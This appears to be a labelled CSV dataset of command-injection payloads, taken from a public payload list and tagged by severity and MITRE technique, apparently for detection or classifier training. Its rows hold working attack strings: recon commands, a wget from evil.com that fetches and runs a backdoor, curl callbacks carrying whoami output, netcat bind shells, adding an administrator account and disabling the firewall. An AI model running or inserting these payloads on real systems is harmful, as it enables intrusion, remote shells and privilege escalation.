Payload,Signature,AttackType,Severity,MITRE,Label,Description
exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('ls'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('pwd'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('pwd');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('sleep 5'),CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('sleep 5');,CommandInjection_Generic,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('whoami'),CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
exec('whoami');,CMDi_Unix,Command Injection,Critical,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
";{$_GET[""cmd""]}",CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
`id`,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"; echo ""vulnerable"" > /tmp/pwned.txt",CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& whoami,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;id;,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&&id,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;id\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ifconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
/index.html|id|,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ipconfig,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ipconfig /all,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
$(`ls`),CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -l /,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -l /,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -l /,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -l /,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ls -l /,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -laR /etc,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -laR /etc,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -laR /etc,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -laR /etc,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -laR /var/www,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -laR /var/www,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -laR /var/www,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -laR /var/www,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -l /home/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -l /home/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -l /home/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -l /home/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ls -l /home/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
*; ls -lhtR /var/www/,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -l /tmp,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -l /tmp,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -l /tmp,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -l /tmp,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ls -l /tmp,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| ls -l /var/www/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; ls -l /var/www/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& ls -l /var/www/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& ls -l /var/www/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
ls -l /var/www/*,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!--#exec cmd=""/usr/bin/id;-->",CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| powershell -enc BASE64_ENCODED_COMMAND,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,CMDi_Unix,Command Injection,High,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\n/bin/ls -al\n,CMDi_Unix,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| nc -lvvp 4444 -e /bin/sh|,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; nc -lvvp 4444 -e /bin/sh;,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& nc -lvvp 4444 -e /bin/sh&,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& nc -lvvp 4444 -e /bin/sh &,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
nc -lvvp 4444 -e /bin/sh,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
nc -lvvp 4445 -e /bin/sh &,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
nc -lvvp 4446 -e /bin/sh|,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
nc -lvvp 4447 -e /bin/sh;,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
nc -lvvp 4448 -e /bin/sh&,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\necho INJECTX\nexit\n\033[2Asleep 5\n,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n,CommandInjection_Generic,Command Injection,Medium,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| net localgroup Administrators hacker /ADD,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; net localgroup Administrators hacker /ADD,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& net localgroup Administrators hacker /ADD,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& net localgroup Administrators hacker /ADD,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
net localgroup Administrators hacker /ADD,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
| netsh firewall set opmode disable,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
; netsh firewall set opmode disable,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
& netsh firewall set opmode disable,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
&& netsh firewall set opmode disable,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
netsh firewall set opmode disable,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
netstat,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
;netstat -a;,CommandInjection_Generic,Command Injection,Low,T1059,Malicious,Command Injection payload from payloadbox/command-injection-payload-list repository (ismailtasdelen-patch-1 branch)
